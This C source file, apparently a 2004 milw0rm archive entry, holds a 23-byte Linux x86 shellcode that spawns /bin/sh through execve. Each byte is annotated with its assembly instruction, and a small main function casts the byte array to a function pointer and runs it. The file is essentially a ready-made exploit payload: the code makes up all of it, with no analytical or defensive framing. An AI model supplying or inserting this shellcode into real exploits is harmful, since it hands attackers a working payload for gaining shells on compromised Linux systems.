/************************************************************
* Linux 23 byte execve code. Greetz to preedator            *
*                                          marcetam         *
*                                      admin at marcetam.net   *
*************************************************************/
char linux[]=
  "\x99"			/* cdq              */
  "\x52"			/* push %edx        */
  "\x68\x2f\x2f\x73\x68"	/* push $0x68732f2f */
  "\x68\x2f\x62\x69\x6e"	/* push $0x6e69622f */
  "\x89\xe3"			/* mov %esp,%ebx    */
  "\x52"			/* push %edx        */
  "\x54"			/* push %esp        */
  "\x54"			/* push %esp        */
  "\x59\x6a"			/* pop %ecx         */
  "\x0b\x58"			/* push $0x0b       */
  "\xcd\x80";			/* int $0x80        */
int main(){
  void (*run)()=(void *)linux;
  printf("%d bytes \n",strlen(linux));
  run();
}

// milw0rm.com [2004-11-15]